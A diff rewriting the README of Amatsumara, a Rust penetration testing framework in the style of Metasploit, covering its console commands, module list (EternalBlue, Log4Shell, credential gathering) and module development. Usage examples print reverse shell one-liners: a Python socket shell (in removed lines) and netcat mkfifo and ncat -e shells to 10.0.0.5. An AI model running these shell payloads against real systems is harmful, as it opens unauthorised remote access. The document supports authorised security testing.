@@ -5,264 +5,150 @@
 </p>
 
 <p align="center">
-  <strong>A modern penetration testing framework built in Rust</strong>
+  <strong>A penetration testing framework built in Rust</strong>
 </p>
 
 <p align="center">
-  Inspired by Metasploit Framework with a focus on safety, performance, and modularity
+  Modules compile as native shared libraries and load dynamically at runtime.
 </p>
 
 ---
 
 ## Overview
 
-Amatsumara is a penetration testing framework that provides a Metasploit-like experience while leveraging Rust's performance, safety, and concurrency. Modules are compiled as native shared libraries and loaded dynamically at runtime, giving you the flexibility of a scripted framework with the speed of compiled code.
-
-### At a Glance
+Amatsumara is a penetration testing framework built for performance and safety. Modules are `.so` shared libraries loaded via C FFI — add new capabilities by dropping a `.so` into the modules directory.
 
 | | Count |
 |---|---|
-| Exploit Modules | 77 |
-| Auxiliary Modules | 16 |
+| Exploit Modules | 3 |
+| Auxiliary Scanners | 16 |
 | Post-Exploitation Modules | 2 |
 | Payload Generators | 9 |
 
-> **Note:** Additional exploit modules are actively in development and will be added in batches as they are completed and tested.
+### Features
 
-### Key Features
-
-- **Dynamic Module Loading** - Modules are `.so` shared libraries loaded at runtime. Add new modules without recompiling the framework.
-- **Tab Completion** - Commands, module names, option names, and subcommands all support tab completion.
-- **Session Management** - Open, background, interact with, and kill sessions across multiple targets.
-- **Background Jobs** - Run long-running modules (like listeners) in the background while you continue working.
-- **Global Options** - Set options like `LHOST` once and have them apply across all modules.
-- **Numbered Search** - Search results are numbered for quick `use 0` selection.
-- **Async Runtime** - Built on Tokio for non-blocking I/O and concurrent operations.
+- **Dynamic Module Loading** — `.so` modules loaded at runtime, no framework recompile needed
+- **Tab Completion** — commands, module names, options, subcommands
+- **Session Management** — open, background, interact, kill sessions across targets
+- **Background Jobs** — run listeners in the background with `-j`
+- **Global Options** — `setg LHOST` once, applies everywhere
+- **Numbered Search** — `search` results are numbered for quick `use 0` selection
+- **Async Runtime** — built on Tokio
 
 ---
 
 ## Installation
 
-### Requirements
-
-- Rust toolchain (1.70+)
-- Linux (x86_64)
-
-### Build from Source
+**Requirements:** Rust 1.70+, Linux x86_64
 
 ```bash
 git clone https://github.com/lorsupra/Amatsumara-Framework.git
 cd Amatsumara-Framework
 cargo build --release
-```
-
-### Launch
-
-```bash
 ./target/release/amatsumara-console
 ```
 
 ---
 
-## Command Reference
+## Commands
 
 ### Module Selection
 
 | Command | Description |
 |---|---|
-| `search <term>` | Search modules by name or description. Results are numbered. |
-| `use <name>` | Select a module by its full name. |
-| `use <number>` | Select a module by its search result number. |
-| `info` | Show detailed info about the currently selected module. |
-| `info <name>` | Show detailed info about a specific module. |
-| `info <number>` | Show detailed info by search result number. |
-| `back` | Deselect the current module and return to the main prompt. |
+| `search <term>` | Search modules by name/description. Results are numbered. |
+| `use <name\|number>` | Select a module by name or search result number. |
+| `info [name\|number]` | Show module details. No argument = current module. |
+| `back` | Deselect current module. |
 
 ### Options
 
 | Command | Description |
 |---|---|
-| `set <OPTION> <value>` | Set an option for the current module. Cleared when you switch modules. |
-| `forge <OPTION> <value>` | Alias for `set`. Forge your options at the anvil. |
-| `unset <OPTION>` | Remove a module-specific option. |
-| `setg <OPTION> <value>` | Set a global option. Persists across all modules for the session. |
-| `unsetg <OPTION>` | Remove a global option. |
-| `options` | Show all options for the current module with their current values. |
+| `set <OPT> <val>` / `forge <OPT> <val>` | Set a module option. |
+| `unset <OPT>` | Clear a module option. |
+| `setg <OPT> <val>` | Set a global option (persists across modules). |
+| `unsetg <OPT>` | Clear a global option. |
+| `options` | Show current module options. |
 
-> **How options resolve:** When a module runs, module-specific options (from `set`) take priority. If an option isn't set locally, the framework falls back to global options (from `setg`). If neither is set, the module's default value is used.
+> Module options (`set`) override globals (`setg`), which override defaults.
 
 ### Execution
 
 | Command | Description |
 |---|---|
-| `run` | Execute the selected module in the foreground. |
-| `strike` | Alias for `run`. Strike the target. |
-| `run -j` / `strike -j` | Execute the module as a background job. |
-| `check` | Run the module's vulnerability check (if supported). |
+| `run` / `strike` | Execute the selected module. |
+| `run -j` | Execute as a background job. |
+| `check` | Run vulnerability check (if module supports it). |
 
-### Sessions
-
-| Command | Description |
-|---|---|
-| `sessions -l` | List all active sessions with ID, type, target, and timestamp. |
-| `sessions -i <id>` | Drop into an interactive shell on the specified session. |
-| `sessions -k <id>` | Kill a specific session by ID. |
-| `sessions -k all` | Kill all active sessions. |
-
-**Inside a session:**
+### Sessions & Jobs
 
 | Command | Description |
 |---|---|
-| `background` | Return to the console. The session stays alive. |
-| `exit` | Close the session and return to the console. |
+| `sessions -l` | List active sessions. |
+| `sessions -i <id>` | Interact with a session. |
+| `sessions -k <id\|all>` | Kill session(s). |
+| `jobs` | List background jobs. |
+| `kill <id>` | Kill a background job. |
 
-### Jobs
-
-| Command | Description |
-|---|---|
-| `jobs` | List all running background jobs with ID, name, and runtime. |
-| `kill <id>` | Terminate a background job by ID. |
+Inside a session: `background` to return to console, `exit` to close.
 
 ### Display
 
 | Command | Description |
 |---|---|
-| `show options` | Same as `options`. Show current module options. |
-| `show exploits` | List all loaded exploit modules. |
-| `show auxiliary` | List all loaded auxiliary modules. |
-| `show payloads` | List all loaded payload modules. |
-| `show post` | List all loaded post-exploitation modules. |
-| `show all` | List every loaded module across all types. |
-
-### Other
-
-| Command | Description |
-|---|---|
-| `help` | Show the built-in help menu. |
-| `?` | Alias for `help`. |
-| `banner` | Redisplay the startup banner. |
-| `exit` | Exit the framework. |
-| `quit` | Alias for `exit`. |
+| `show exploits\|auxiliary\|payloads\|post\|all` | List loaded modules by type. |
+| `help` / `?` | Show help. |
+| `banner` | Redisplay startup banner. |
+| `exit` / `quit` | Exit framework. |
 
 ---
 
-## Usage Examples
+## Usage
 
-### Example 1: Basic Exploit Workflow
+### Exploit Workflow
 
 ```
-amatsumara > search vsftpd
+amatsumara > search log4j
 
-  #    Name                                        Description
-  -    ----                                        -----------
-  0    VSFTPD v2.3.4 Backdoor Command Execution    Exploits the malicious backdoor in vsftpd 2.3.4
+  #    Name                     Description
+  -    ----                     -----------
+  0    Apache Log4j RCE         Log4Shell JNDI injection (CVE-2021-44228)
 
 amatsumara > use 0
-Selected module: VSFTPD v2.3.4 Backdoor Command Execution
-
-amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > options
-
-Module options:
-
-  Name      Current Setting    Required  Description
-  ----      ---------------    --------  -----------
-  RHOST     127.0.0.1          yes       Target address
-  RPORT     21                 yes       Target port
-
-amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > forge RHOST 192.168.1.100
+amatsumara Apache Log4j RCE (exploit) > forge RHOST 192.168.1.100
 RHOST => 192.168.1.100
 
-amatsumara VSFTPD v2.3.4 Backdoor Command Execution (exploit) > strike
-
-[*] Started exploit handler
-[*] Launching module: VSFTPD v2.3.4 Backdoor Command Execution
-[+] Session 1 opened
-
-amatsumara > sessions -i 1
-[*] Starting interaction with session 1
-
-shell> whoami
-root
-shell> background
-[*] Backgrounding session...
+amatsumara Apache Log4j RCE (exploit) > strike
+[*] Launching module: Apache Log4j RCE
 ```
 
-### Example 2: Global Options with Multi-Handler
+### Multi-Handler with Global Options
 
 ```
 amatsumara > setg LHOST 10.0.0.5
-Global LHOST => 10.0.0.5
-
 amatsumara > setg LPORT 4444
-Global LPORT => 4444
 
 amatsumara > use Multi Handler
-Selected module: Multi Handler
-
 amatsumara Multi Handler (exploit) > run -j
-
-[*] Started exploit handler
-[*] Launching module: Multi Handler
 [*] Job 1 started in background
 
 amatsumara > jobs
-
-Active jobs
-
-  Id    Name                                     Running
-  --    ----                                     -------
-  1     Multi Handler                            12s
-
-amatsumara > use Python Reverse TCP
-Selected module: Python Reverse TCP
-
-amatsumara Python Reverse TCP (payload) > run
-
-[*] Module options:
-[*]   LHOST = 10.0.0.5 (global)
-[*]   LPORT = 4444 (global)
-
-[+] Python Reverse Shell Payload:
-    Target: 10.0.0.5:4444
-
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-
-[*] Copy and execute on target system
+  Id    Name             Running
+  --    ----             -------
+  1     Multi Handler    12s
 ```
 
-### Example 3: Generating Payloads
-
-Each payload module generates ready-to-use commands with multiple options:
+### Generating Payloads
 
 ```
-amatsumara > search reverse
-
-  #    Name                            Description
-  -    ----                            -----------
-  0    Linux x64 Reverse TCP Shell     Connect back to attacker and spawn /bin/sh
-  1    Multi Handler                   Generic handler for reverse payloads
-  2    PHP Reverse TCP                 PHP reverse shell with disabled function checks
-  3    Python Reverse TCP              Python reverse shell one-liner (cross-platform)
-  4    Unix Bash Reverse TCP           Reverse shell via bash /dev/tcp builtin
-  5    Unix Netcat Reverse TCP         Reverse shell via netcat with mkfifo backpipe
-  6    Unix Perl Reverse TCP           Reverse shell via Perl IO::Socket
-  7    Unix Ruby Reverse TCP           Reverse shell via Ruby TCPSocket
-  8    Windows PowerShell Reverse TCP  Interactive PowerShell session via reverse TCP
-
-amatsumara > use 5
-Selected module: Unix Netcat Reverse TCP
-
+amatsumara > use Unix Netcat Reverse TCP
 amatsumara Unix Netcat Reverse TCP (payload) > forge LHOST 10.0.0.5
-LHOST => 10.0.0.5
-
 amatsumara Unix Netcat Reverse TCP (payload) > forge LPORT 9001
-LPORT => 9001
-
 amatsumara Unix Netcat Reverse TCP (payload) > strike
 
 [+] Netcat Reverse Shell Payload:
     Target: 10.0.0.5:9001
-    Backpipe: /tmp/ivnrm
 
 === Option 1: Standard nc with mkfifo ===
 mkfifo /tmp/ivnrm; nc 10.0.0.5 9001 0</tmp/ivnrm | /bin/sh >/tmp/ivnrm 2>&1; rm /tmp/ivnrm
@@ -276,109 +162,83 @@ ncat 10.0.0.5 9001 -e /bin/sh
 
 ---
 
-## Module Types
+## Modules
 
-### Exploits (77)
+### Exploits (3)
 
-Exploit modules target specific vulnerabilities in services, applications, and operating systems. Each module implements real protocol-level exploit logic (SMB negotiation, RDP handshakes, HTTP-specific CVE payloads, etc.). Categories include:
+| Module | Description |
+|---|---|
+| `ms17_010` | EternalBlue — SMBv1 kernel RCE (CVE-2017-0144) |
+| `apache_log4j_rce` | Log4Shell — JNDI injection RCE (CVE-2021-44228) |
+| `multi_handler` | Generic listener for reverse shell payloads |
 
-- **Web Applications** - WordPress, Drupal, Joomla, Jenkins, GitLab, Confluence, etc.
-- **Network Services** - FTP, SSH, SMB, RDP, DNS, LDAP, etc.
-- **Operating Systems** - Linux privilege escalation, Windows SMB exploits, etc.
-- **IoT/Embedded** - Routers (Netgear, D-Link, TP-Link), printers, DVRs, etc.
-- **Cloud/Container** - Docker, Kubernetes, AWS, Azure, etc.
-- **Frameworks** - Apache Struts, Spring, Log4j, etc.
+### Auxiliary Scanners (16)
 
-### Auxiliary (16)
-
-Auxiliary modules perform scanning, enumeration, and information gathering:
-
-- **Port Scanners** - TCP port scanner
-- **Service Scanners** - HTTP directory scanner, SMB version, SSH enumeration, FTP anonymous check
-- **Protocol Scanners** - MySQL, Redis, Memcached, LDAP, IMAP, POP3, SMTP, Telnet, VNC, Elasticsearch
-- **Brute Force** - HTTP authentication brute forcer
+FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port scan, Redis, SMB version, SMTP, SNMP, SSH, Telnet, VNC.
 
 ### Post-Exploitation (2)
 
-Post modules run after gaining access to a target:
-
-- **Linux** - System enumeration, credential gathering
+| Module | Description |
+|---|---|
+| `linux_creds` | Gather credentials from common file locations |
+| `linux_enum_system` | System enumeration (users, network, processes) |
 
 ### Payloads (9)
 
-Payload modules generate shell commands and binaries for establishing connections:
-
-| Payload | Platform | Type | Description |
-|---|---|---|---|
-| Unix Bash Reverse TCP | Linux/BSD | Command | Bash `/dev/tcp` builtin with random file descriptor |
-| Unix Netcat Reverse TCP | Linux/BSD | Command | mkfifo backpipe with nc, nc -e, and ncat variants |
-| Unix Perl Reverse TCP | Linux/BSD | Command | IO::Socket and Socket module variants |
-| Unix Ruby Reverse TCP | Linux/BSD | Command | TCPSocket with fork, exec, and interactive variants |
-| Python Reverse TCP | Cross-platform | Command | Python one-liner using socket/subprocess |
-| PHP Reverse TCP | Cross-platform | Command | Robust shell with disabled function checks |
-| Windows PowerShell Reverse TCP | Windows | Command | Direct, Base64 encoded, and .ps1 script options |
-| Linux x64 Reverse TCP Shell | Linux | Binary | Compiled native reverse shell |
-| Linux x64 Bind TCP Shell | Linux | Binary | Compiled native bind shell |
+| Payload | Platform |
+|---|---|
+| Bash Reverse TCP | Linux/BSD |
+| Netcat Reverse TCP | Linux/BSD |
+| Perl Reverse TCP | Linux/BSD |
+| Ruby Reverse TCP | Linux/BSD |
+| Python Reverse TCP | Cross-platform |
+| PHP Reverse TCP | Cross-platform |
+| PowerShell Reverse TCP | Windows |
+| Linux x64 Reverse TCP | Linux (binary) |
+| Linux x64 Bind TCP | Linux (binary) |
 
 ---
 
 ## Architecture
 
-### Project Structure
-
 ```
 Amatsumara-Framework/
-├── amatsumara-api/        # C-compatible FFI types (ModuleVTable, ModuleInfo, etc.)
-├── amatsumara-core/       # Module loader, session manager, discovery engine
-├── amatsumara-console/    # Interactive console (REPL, commands, tab completion)
-├── kanayago/              # HTTP client, pattern generation utilities
+├── amatsumara-api/        # C FFI types (ModuleVTable, ModuleInfo, etc.)
+├── amatsumara-core/       # Module loader, session manager, discovery
+├── amatsumara-console/    # Interactive REPL, tab completion
+├── kanayago/              # Payload generation engine
 ├── modules/
-│   ├── exploits/          # Exploit .so files and source
-│   ├── auxiliary/         # Scanner/enum .so files
-│   ├── post/              # Post-exploitation .so files
-│   └── payloads/          # Payload generator .so files
-│       └── singles/
-│           ├── cmd/unix/      # Bash, netcat, perl, ruby
-│           ├── cmd/windows/   # PowerShell
-│           ├── multi/         # Python (cross-platform)
-│           ├── php/           # PHP
-│           └── linux/x64/     # Compiled binary payloads
+│   ├── exploits/          # Exploit modules (.so + source)
+│   ├── auxiliary/scanner/ # Scanner modules
+│   ├── post/              # Post-exploitation modules
+│   └── payloads/singles/  # Payload generators
 ├── pattern-create/        # Buffer overflow pattern generator
-└── pattern-offset/        # Buffer overflow pattern offset finder
+└── pattern-offset/        # Pattern offset finder
 ```
 
-### How Module Loading Works
+### Module Loading
 
-Modules are compiled as `cdylib` shared libraries (`.so` files). At startup, the framework:
+1. Framework scans `modules/` recursively for `.so` files at startup
+2. Loads each library, calls `amatsumara_module_init()` to get the VTable
+3. Reads metadata via C FFI, indexes by name for search/selection
+4. Drop a new `.so` into modules/ and restart — it's discovered automatically
 
-1. Scans the `modules/` directory tree recursively for `.so` files
-2. Loads each library and calls `amatsumara_module_init()` to get the module's VTable
-3. Reads module metadata (name, type, options, platforms, etc.) via the C FFI
-4. Indexes modules by name for search and selection
+### Sessions
 
-This means you can add a new module by dropping a `.so` file into the modules directory and restarting the console.
-
-### Session Architecture
-
-Sessions use file-based IPC to work across shared library boundaries:
-
-1. An exploit module opens a TCP connection to a target
-2. The module writes session metadata to `/tmp/amatsumara_sessions/`
-3. The console reads the session file and takes ownership of the TCP stream
-4. The session persists independently - you can background it, interact later, or kill it
+Exploit modules open TCP connections and write session metadata to `/tmp/amatsumara_sessions/`. The console takes ownership of the stream. Sessions persist independently — background, interact later, or kill.
 
 ---
 
 ## Developing Modules
 
-### Creating a New Module
+Each module is a standalone `cdylib` Rust crate exporting `amatsumara_module_init() -> *const ModuleVTable`.
 
 ```bash
-# Create the module directory
 mkdir -p modules/exploits/my_exploit/src
+```
 
-# Create Cargo.toml
-cat > modules/exploits/my_exploit/Cargo.toml << 'EOF'
+**Cargo.toml:**
+```toml
 [package]
 name = "my_exploit"
 version = "0.1.0"
@@ -391,201 +251,72 @@ crate-type = ["cdylib"]
 amatsumara-api = { path = "../../../amatsumara-api" }
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
-EOF
 ```
 
-### Module Template (src/lib.rs)
+**src/lib.rs** — see any existing module for the pattern. Key points:
 
-```rust
-use amatsumara_api::*;
-use std::os::raw::{c_char, c_int, c_void};
-use serde::Deserialize;
-use std::ffi::CStr;
+- Use `amatsumara_api::CString` (repr(C)), not `std::ffi::CString`
+- Static metadata strings with `CString` wrappers pointing to `.as_ptr()`
+- Options passed as JSON `*const c_char`, parsed with `serde_json`
+- Return `0` for success, non-zero for failure
 
-// Module metadata (static strings for FFI)
-static NAME: &str = "My Exploit Name";
-static DESCRIPTION: &str = "What this exploit does";
-static AUTHOR: &str = "Your Name";
-
-// Define options
-static RHOST_NAME: &str = "RHOST";
-static RHOST_DESC: &str = "Target address";
-static RHOST_DEFAULT: &str = "127.0.0.1";
-
-static OPTIONS: &[ModuleOption] = &[
-    ModuleOption {
-        name: CString { ptr: RHOST_NAME.as_ptr() as *const c_char, len: RHOST_NAME.len() },
-        description: CString { ptr: RHOST_DESC.as_ptr() as *const c_char, len: RHOST_DESC.len() },
-        required: true,
-        option_type: OptionType::Address,
-        default_value: CString { ptr: RHOST_DEFAULT.as_ptr() as *const c_char, len: RHOST_DEFAULT.len() },
-    },
-];
-
-// Wire up the module info and vtable
-static MODULE_INFO: ModuleInfo = ModuleInfo {
-    api_version: MODULE_API_VERSION,
-    metadata: ModuleMetadata {
-        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
-        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
-        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
-        module_type: ModuleType::Exploit,
-        platforms: PlatformArray { ptr: [Platform::Linux].as_ptr(), len: 1 },
-        archs: ArchArray { ptr: [Arch::X64].as_ptr(), len: 1 },
-        ranking: Ranking::Normal,
-        privileged: false,
-    },
-    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
-};
-
-static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
-
-// Required FFI functions
-extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
-extern "C" fn init() -> *mut c_void {
-    Box::into_raw(Box::new(0u8)) as *mut c_void
-}
-extern "C" fn destroy(instance: *mut c_void) {
-    if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut u8); } }
-}
-
-// Deserialize options from JSON
-#[derive(Deserialize)]
-struct MyOptions {
-    #[serde(rename = "RHOST")]
-    rhost: Option<String>,
-}
-
-extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
-    // Parse options
-    let config_str = unsafe { CStr::from_ptr(config).to_str().unwrap_or("{}") };
-    let opts: MyOptions = serde_json::from_str(config_str).unwrap_or(MyOptions { rhost: None });
-
-    let rhost = match opts.rhost {
-        Some(h) => h,
-        None => { eprintln!("[-] RHOST required"); return 1; }
-    };
-
-    println!("[*] Targeting {}", rhost);
-
-    // Your exploit logic here
-
-    0 // Return 0 for success, non-zero for failure
-}
-
-// Entry point - the framework calls this to get the VTable
-#[no_mangle]
-pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
-```
-
-### Build and Deploy
-
+**Build & deploy:**
 ```bash
 cd modules/exploits/my_exploit
 cargo build --release
-cp target/release/libmy_exploit.so ../../   # Copy to modules/exploits/
+cp target/release/libmy_exploit.so .
+rm -rf target/
 ```
-
-The module will be automatically discovered on the next console launch.
-
----
-
-## Comparison to Metasploit
-
-| Feature | Metasploit (Ruby) | Amatsumara (Rust) |
-|---|---|---|
-| Language | Ruby (interpreted) | Rust (compiled) |
-| Module Loading | Ruby `require` | Dynamic `.so` via C FFI |
-| Type Safety | Runtime checks | Compile-time guarantees |
-| Concurrency | GIL-limited threads | Lock-free async (Tokio) |
-| Memory | Garbage collected | Zero-cost abstractions |
-| Performance | Interpreted | Native machine code |
-| Session Management | In-process | File-based IPC |
-| Tab Completion | Yes | Yes |
-| Background Jobs | Yes | Yes |
-| Global Options | Yes (`setg`) | Yes (`setg`) |
 
 ---
 
 ## Utilities
 
-### pattern-create
-
-Generate cyclic patterns for buffer overflow development:
-
 ```bash
+# Generate cyclic pattern for buffer overflow dev
 ./target/release/pattern-create -l 500
-```
 
-### pattern-offset
-
-Find the offset of a pattern value:
-
-```bash
+# Find offset of a pattern value
 ./target/release/pattern-offset -q 41386141
 ```
 
 ---
 
-## Roadmap
+## Changelog
 
-### v1.3.0 (Current Release)
-- [x] **Full MS17-010 EternalBlue implementation** — kernel-level RCE via SMBv1 pool overflow
-  - Raw SMB1 protocol stack, non-paged pool grooming, SrvOs2FeaListToNt integer overflow
-  - Embedded x64 kernel shellcode (ring-0 → ring-3 APC injection) + userland reverse TCP shell
-  - SrvNet buffer corruption with fake SRVNET_BUFFER_HDR targeting HAL heap
-  - Runtime LHOST/LPORT patching, integrated reverse shell listener, automatic session registration
-  - 5 unit tests (handshake safety, shellcode patching, struct validation)
-- [x] Removed duplicate MS17-010 stub module
+**v2.0.0** — Removed non-functioning exploit modules. Quality over quantity. Starting fresh with 3 confirmed working exploits.
 
-### v1.2.0
-- [x] 8 high-impact exploit modules (70 → 78 exploits)
+**v1.4.1** — Audit and bug fixes across 10 modules (port defaults, protocol formatting, nonce extraction, payload targeting).
 
-### v1.1.0
-- [x] 8 new HTTP-based exploit modules (62 → 70 exploits)
+**v1.3.0** — Full MS17-010 EternalBlue implementation with kernel shellcode and automatic session registration.
 
-### v1.0.1
-- [x] HTTPS transport fix — migrated 22 exploit modules from raw TcpStream to reqwest
+**v1.2.0** — 8 new exploit modules.
 
-### v1.0.0
-- [x] Dynamic module loading via C FFI
-- [x] Module registry and auto-discovery
-- [x] Interactive console with tab completion
-- [x] Command history persistence
-- [x] Session management with file-based IPC
-- [x] Numbered search and selection
-- [x] Global options (`setg`/`unsetg`)
-- [x] Background jobs (`run -j`, `jobs`, `kill`)
-- [x] Shinto-themed aliases (`forge`, `strike`)
-- [x] 62 exploit modules
-- [x] 16 auxiliary modules
-- [x] 2 post-exploitation modules
-- [x] 9 payload generators (bash, python, perl, ruby, netcat, php, powershell, binary)
-- [x] Multi-handler listener
-- [x] Pattern generation tools (pattern-create, pattern-offset)
+**v1.1.0** — 8 new HTTP-based exploit modules.
+
+**v1.0.1** — HTTPS transport fix across 22 modules.
+
+**v1.0.0** — Initial release. Dynamic module loading, interactive console, session management, background jobs, 9 payload generators, pattern utilities.
 
 ### Future
-- [ ] Staged payloads (meterpreter-style agent)
-- [ ] Resource scripts (batch command files)
-- [ ] Database integration for target/loot tracking
-- [ ] Module encoders for payload obfuscation
+
+- Staged payloads (meterpreter-style agent)
+- Resource scripts (batch command files)
+- Database integration for target/loot tracking
+- New exploit modules (added only after proper testing)
 
 ---
 
 ## Contributing
 
-Contributions welcome. Areas of interest:
+Areas of interest:
 
-1. **Exploit Modules** - Port from Metasploit or write new ones
-2. **Protocol Libraries** - SSH, SMB, RDP client implementations
-3. **Auxiliary Modules** - Scanners, brute forcers, enumerators
-4. **Payloads** - New payload types, staged payloads, encoders
-5. **Testing** - Validation against vulnerable targets (Metasploitable, HackTheBox, etc.)
+1. **Exploit Modules** — new vulnerability implementations
+2. **Protocol Libraries** — SSH, SMB, RDP implementations
+3. **Auxiliary Modules** — scanners, brute forcers, enumerators
+4. **Payloads** — new types, staged payloads, encoders
+5. **Testing** — validation against vulnerable targets
 
 ## License
 
 BSD-3-Clause
-
----
-
-**Built with Rust**
